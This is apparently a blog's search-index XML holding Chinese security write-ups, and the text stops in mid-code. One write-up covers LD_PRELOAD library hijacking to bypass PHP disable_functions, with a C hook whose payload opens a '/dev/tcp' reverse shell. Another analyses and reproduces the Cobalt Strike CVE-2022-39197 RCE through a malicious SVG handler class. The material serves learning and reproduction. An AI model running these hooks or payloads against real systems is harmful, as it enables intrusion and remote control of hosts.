<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>劫持LD_PRELOAD</title>
    <link href="/2023/01/12/%E5%8A%AB%E6%8C%81LD_PRELOAD/"/>
    <url>/2023/01/12/%E5%8A%AB%E6%8C%81LD_PRELOAD/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>LD_PRELOAD是Linux系统中的一个环境变量，作用是在程序在运行链接之前优先加载LD_PRELOAD中的链接库，因此通过指定LD_PRELOAD变量我们可以实现二进制程序的链接库劫持，覆盖重写原来的系统调用。</p><h2 id="0x01-劫持系统命令"><a href="#0x01-劫持系统命令" class="headerlink" title="0x01 劫持系统命令"></a>0x01 劫持系统命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LD_PRELOAD=&lt;path_to_so&gt;   <span class="hljs-comment">#设置</span><br><span class="hljs-comment">#或者可以执行时指定，好处是仅作用于本次命令</span><br><span class="hljs-comment">#LD_PRELOAD=$PWD/hook_ls.so ls</span><br><span class="hljs-built_in">unset</span> LD_PRELOAD    <span class="hljs-comment">#解除</span><br></code></pre></td></tr></table></figure><p>以ls命令为例使用<code>readelf -Ws /usr/bin/ls</code>查看ls命令调用的库函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Num:    Value          Size Type    Bind   Vis      Ndx Name<br>     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND <br>     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_toupper_loc@GLIBC_2.3 (2)<br>     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.2.5 (3)<br>     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND cap_to_text<br>     4: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __progname@GLIBC_2.2.5 (3)<br>     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sigprocmask@GLIBC_2.2.5 (3)<br>     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __snprintf_chk@GLIBC_2.3.4 (4)<br>     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.2.5 (3)<br>     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (3)<br>     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.2.5 (3)<br>    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (3)<br>    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strncmp@GLIBC_2.2.5 (3)<br>    12: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTable<br>    13: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.2.5 (3)<br> . . . . . . . <br></code></pre></td></tr></table></figure><p>选择strncmp进行劫持，重新定义strncmp的函数体，注意<strong>参数列表必须保持不变</strong>，记得unsetenv。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//hook_ls.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;echo Hijacked!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">strncmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s2, <span class="hljs-type">size_t</span> __n)</span> &#123;    <br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译并设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC hook_ls.c -o hook_ls.so<br><span class="hljs-built_in">export</span> LD_PRELOAD=<span class="hljs-variable">$PWD</span>/hook_ls.so<br></code></pre></td></tr></table></figure><p>最后执行ls</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[spring@VM codes]$ <span class="hljs-built_in">export</span> LD_PRELOAD=<span class="hljs-variable">$PWD</span>/hook_ls.so<br>[spring@VM codes]$ <span class="hljs-built_in">ls</span><br>Hijacked!<br>hook_ls.c  hook_ls.so<br></code></pre></td></tr></table></figure><h2 id="0x02-绕过-Disable-Functions"><a href="#0x02-绕过-Disable-Functions" class="headerlink" title="0x02 绕过 Disable_Functions"></a>0x02 绕过 Disable_Functions</h2><p>在拿到php环境下的webshell时常常遇到Disable_Functions禁用系统命令执行的情况，使用LD_PRELOAD也可以实现bypass。</p><p>根据上述LD_PRELOAD劫持的特点，欲将其用于bypass Disable_Functions需要满足以下几个条件：</p><ul><li>由于LD_PRELOAD是在程序链接之前起作用，因此我们无法在现有php进程中实现劫持，<strong>必须要寻找能够创建新进程的函数</strong>。</li><li><strong>环境变量需要可控</strong>，例如可以使用putenv()函数。</li></ul><h3 id="mail"><a href="#mail" class="headerlink" title="mail()"></a>mail()</h3><p>mail()函数是php内置用于发送邮件的函数，在底层是调用Linux中的sendmail函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//mail.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;a@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行并使用strace跟踪系统调用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -f php mail.php 2&gt;&amp;1 &#124; grep -A2 -B2 execve<br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[spring@VM codes]$ strace -f php mail.php 2&gt;&amp;1 &#124; grep -A2 -B2 execve<br>execve(<span class="hljs-string">&quot;/usr/local/lighthouse/softwares/php/bin/php&quot;</span>, [<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;mail.php&quot;</span>], 0x7ffefe042d70 /* 30 vars */) = 0<br>brk(NULL)                               = 0x1e22000<br>arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd432847b0) = -1 EINVAL (无效的参数)<br>--<br>[pid 2432766] fcntl(4, F_SETFD, 0)      = 0<br>[pid 2432767] dup2(3, 0)                = 0<br>[pid 2432767] execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/usr/sbin/sendmail -t -i &quot;</span>], 0x1e22d90 /* 30 vars */ &lt;unfinished ...&gt;<br>[pid 2432766] fstat(4,  &lt;unfinished ...&gt;<br>[pid 2432767] &lt;... execve resumed&gt;)     = 0<br>[pid 2432766] &lt;... fstat resumed&gt;&#123;st_mode=S_IFIFO&#124;0600, st_size=0, ...&#125;) = 0<br>[pid 2432767] brk(NULL)                 = 0x55a7a0633000<br>--<br>[pid 2432767] rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f5dd9a87790&#125;, &#123;sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f5dd9a87790&#125;, 8) = 0<br>[pid 2432767] rt_sigaction(SIGCHLD, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER&#124;SA_RESTART, sa_restorer=0x7f5dd9a87790&#125;, &#123;sa_handler=0x55a79e54a180, sa_mask=[], sa_flags=SA_RESTORER&#124;SA_RESTART, sa_restorer=0x7f5dd9a87790&#125;, 8) = 0<br>[pid 2432767] execve(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, [<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>], 0x55a7a0641c30 /* 30 vars */) = -1 ENOENT (没有那个文件或目录)<br>[pid 2432767] <span class="hljs-built_in">stat</span>(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, 0x7ffc517fd470) = -1 ENOENT <br>[pid 2432767] <span class="hljs-built_in">stat</span>(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, 0x7ffc517fd450) = -1 ENOENT <br></code></pre></td></tr></table></figure><p>明显是调用了<code>/usr/sbin/sendmail</code>，同时execve启用了新进程，因此劫持sendmail()即可劫持mail()。</p><p>下一步查看sendmail()的库函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">readelf -Ws /usr/sbin/sendmail<br></code></pre></td></tr></table></figure><p>(我的vps里没有sendmail拓展，不过问题不大后续可以解决这个问题)</p><p>挑选getuid函数进行劫持：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//hook_getuid.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;port&gt; 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br><span class="hljs-comment">//最后编译生成 gcc -shared -fPIC hook_getuid.c -o hook_getuid.so</span><br></code></pre></td></tr></table></figure><p>然后在脚本中设置环境变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="hljs-comment">// 注意这里的目录要有访问权限</span><br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;test@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行即可实现劫持。</p><h3 id="error-log"><a href="#error-log" class="headerlink" title="error_log()"></a>error_log()</h3><p>error_log()和mail()一样也会调用sendmail，劫持的过程没有差别不再赘述</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="hljs-comment">// 注意这里的目录要有访问权限</span><br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>能创建新进程的函数含有很多，有时候要根据主机所安装的拓展因地制宜。</p><h2 id="0x03-attribute-constructor"><a href="#0x03-attribute-constructor" class="headerlink" title="0x03  __attribute__((constructor))"></a>0x03  __attribute__((constructor))</h2><p>上面提到在我的vps中没有sendmail拓展，因此事实上我们无法实现劫持，因此我们需要一个通用的解决方案，那就是C语言的一个拓展修饰符<code>__attribute__((constructor))</code>，由它所修饰的函数将在程序main()函数之前执行，如果它存在于动态链接库中，那么它将会在动态链接库被系统加载之前执行。这样就可以实现对于链接的劫持，而不是局限于特定的系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//同样去劫持ls</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo Hijacked!&quot;</span>);<br>&#125;<br><span class="hljs-comment">//编译执行 gcc -shared -fPIC hook_ls.c -o hook_ls.so</span><br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.anquanke.com/post/id/254388">https://www.anquanke.com/post/id/254388</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
    <tags>
      
      <tag>LD_PRELOAD</tag>
      
      <tag>hijack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux系统编程</title>
    <link href="/2023/01/01/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/01/01/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-39197(CS&lt;=4.7.1 RCE)分析复现</title>
    <link href="/2022/10/18/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/10/18/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike-lt-x3D-4-7-1-RCE-简单分析与复现"><a href="#Cobalt-Strike-lt-x3D-4-7-1-RCE-简单分析与复现" class="headerlink" title="Cobalt Strike &lt;&#x3D;4.7.1 RCE 简单分析与复现"></a>Cobalt Strike &lt;&#x3D;4.7.1 RCE 简单分析与复现</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2022-39197这个洞是前段时间爆出来的，具体的复现过程也是拜读了漂亮鼠师傅的文章:</p><p><a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ">https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</a></p><p>漏洞具体的细节不再赘述，思路和上面提到的文章一样，核心就是以下几点：</p><ul><li>由于Swing库依赖加上CS本身的UI对html的渲染，导致我们引入html标签造成XSS。</li><li>CS里规定了不同的html标签有不同的解析方式，其中&lt;object&gt;标签允许我们传入指定类完成特定操作，要求是<ol><li>传入的类必须继承Component</li><li>类必须有无参构造方法</li><li>类必须存在一个拥有setXXX方法的属性</li><li>setXXX方法只能传入一个String作为参数</li></ol></li><li>关于触发点，我们需要找到CS中通过AES传输的数据模块，比如note、processlist、computer等</li></ul><h2 id="0x01-使用codeql寻找符合条件的类"><a href="#0x01-使用codeql寻找符合条件的类" class="headerlink" title="0x01 使用codeql寻找符合条件的类"></a>0x01 使用codeql寻找符合条件的类</h2><p>类的约束我们已经有了，下面就是怎么找的问题，首先直接在idea里搜索肯定是不行的，仅仅是继承自Component的子类在jdk中就有上百个：</p><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221022235902337.png" alt="image-20221022235902337"></p><p>一个个筛肯定是不行的(如果有耐心的话好像也不是不行- -)，更好的办法肯定就是用静态分析工具了，使用codeql、tabby编写对应规则然后进行静态分析即可，好像还有师傅用Gadget Inspector直接搞出了攻击链，这点我不是很清楚，我使用的是codeql。</p><p>由于之前有编译好的jdk8的数据库，为图省事我就直接拿来用了，使用我粗糙的手法简单写一下ql语句，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassOrInterface</span>&#123;<br>    MyComponent()&#123;<br>        <span class="hljs-built_in">this</span>.getName()=<span class="hljs-string">&quot;Component&quot;</span> or <br>        <span class="hljs-built_in">this</span>.getAnAncestor().getName()=<span class="hljs-string">&quot;Component&quot;</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UsableClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RefType</span> &#123;<br>    UsableClass()&#123;<br>        <span class="hljs-built_in">this</span>.getAConstructor().hasNoParameters() and <br>        <span class="hljs-built_in">this</span>.getAConstructor().isPublic()<br>    &#125;<br>&#125;<br><br>predicate <span class="hljs-title function_">isMyClass</span><span class="hljs-params">( Class m)</span>&#123;<br>    m.getASourceSupertype() <span class="hljs-keyword">instanceof</span> MyComponent and<br>    m <span class="hljs-keyword">instanceof</span> UsableClass <br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UsableMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span> &#123;<br>    UsableMethod() &#123;<br>        <span class="hljs-built_in">this</span>.getNumberOfParameters() = <span class="hljs-number">1</span><br>        and <span class="hljs-built_in">this</span>.getAParamType().hasName(<span class="hljs-string">&quot;String&quot;</span>)<br>        and <span class="hljs-built_in">this</span>.isPublic()<br>        and <span class="hljs-built_in">this</span>.getName().matches(<span class="hljs-string">&quot;set%&quot;</span>)<br>        &#125;<br>    &#125;<br><br>from UsableMethod me ,UsableClass cla<br>where <br>    <span class="hljs-title function_">isMyClass</span><span class="hljs-params">(cla)</span> and me.getDeclaringType() = cla<br>select cla<br><br></code></pre></td></tr></table></figure><p>结果是30多个类：</p><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221023001615811.png" alt="image-20221023001615811"></p><p>然后我开始逐一寻找有无可以通过setXXX构造出攻击链的类，但是寻找了一番后没有结果，而且这些类都是来自jdk自带的Swing标准库，作为一个老牌UI库应该很难能有漏洞利用点。</p><p>就在陷入迷茫的时候，我突然想到，CS里是不是自带的lib里引入了swing库，结果一看确实存在，就在org.apache.batik包内。于是下面我用同样的方法，编译CS的源码载入codeql的database，结果也是30多个类，大多数类也都没有利用点，但有一个类 JSVGCanvas 引起了我的注意。</p><h2 id="0x02-org-apache-batik-JSVGCanvas"><a href="#0x02-org-apache-batik-JSVGCanvas" class="headerlink" title="0x02 org.apache.batik.JSVGCanvas"></a>0x02 org.apache.batik.JSVGCanvas</h2><p>JSVGCanvas类里有一个setURI方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setURI</span><span class="hljs-params">(String var1)</span> &#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.uri;<br>   <span class="hljs-built_in">this</span>.uri = var1;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-built_in">this</span>.loadSVGDocument(<span class="hljs-built_in">this</span>.uri);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">this</span>.setSVGDocument((SVGDocument)<span class="hljs-literal">null</span>);<br>   &#125;<br><br>   <span class="hljs-built_in">this</span>.pcs.firePropertyChange(<span class="hljs-string">&quot;URI&quot;</span>, var2, <span class="hljs-built_in">this</span>.uri);<br>&#125;<br></code></pre></td></tr></table></figure><p>代码很直白，直接允许我们引入外部svg，其实到这里我是比较怀疑的，在我的印象中svg不是图片格式么，通过引用图片能直接触发RCE吗？</p><p>然后我就在这里卡了很久，网上关于svg安全问题的资料几乎没有，最后看到了国外的一篇<a href="https://securityintelligence.com/posts/analysis-rce-vulnerability-cobalt-strike/">文章</a>，是查了<a href="https://xmlgraphics.apache.org/batik/using/scripting/java.html">batik的文档</a>才发现的。</p><p>文档中有一段代码提到：</p><blockquote><p>The follow code template demonstrates how to manipulate an SVG document displayed in a <a href="https://xmlgraphics.apache.org/batik/javadoc/org/apache/batik/swing/JSVGCanvas.html">JSVGCanvas</a> directly from a Java program. You don’t have to worry about graphics updates; after each event listener invocation the canvas is updated if needed.</p></blockquote><p>告诉我们如何通过去加载SVGDocument，代码样例有很多UI库里的Action实现，这给了我们一个启发，我们可以直接注册一个listner去监听初始化进程，当svg加载的时候就可以直接触发恶意代码。</p><p>在文档的末尾提到如何利用svg去执行java代码：</p><p><img src="/CVE-2022-39197-CS-4-7-1RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221023005415495.png" alt="image-20221023005415495"></p><p>可以看到svg是支持插入html标签的，根据文档指示我们可以归纳出以下几点要求：</p><ul><li>需要在指定SVG中插入html，并指定<strong>xlink:href</strong>属性为java归档文件</li><li>类必须继承自<strong>EventListenerInitializer</strong>，需要添加listener以触发执行指定代码</li><li>需要在jar清单中指定<strong>SVG-Handler-Class</strong>属性为类路径</li></ul><p>顺着这些要求我们下一步开始构造。</p><h2 id="0x03-触发漏洞"><a href="#0x03-触发漏洞" class="headerlink" title="0x03 触发漏洞"></a>0x03 触发漏洞</h2><p>batik可以直接通过maven引入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>xml-apis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xml-apis-ext<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.04<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先是编写好要执行的java代码，重写匿名内部类的handleEvent方法，嵌入恶意代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//EvilSVG.java</span><br><span class="hljs-keyword">package</span> org.spring.test;<br><span class="hljs-keyword">import</span> org.w3c.dom.events.EventListener;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.EventListenerInitializer;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.SVGDocument;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.SVGSVGElement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilSVG</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EventListenerInitializer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilSVG</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializeEventListeners</span><span class="hljs-params">(SVGDocument svgDocument)</span> &#123;<br>        <span class="hljs-type">SVGSVGElement</span> <span class="hljs-variable">rootElement</span> <span class="hljs-operator">=</span> svgDocument.getRootElement();<br>        <span class="hljs-type">EventListener</span> <span class="hljs-variable">eventListener</span> <span class="hljs-operator">=</span> event -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            &#125;<br>        &#125;;<br>        rootElement.addEventListener(<span class="hljs-string">&quot;spring&quot;</span>, eventListener,<span class="hljs-literal">false</span>);<br>    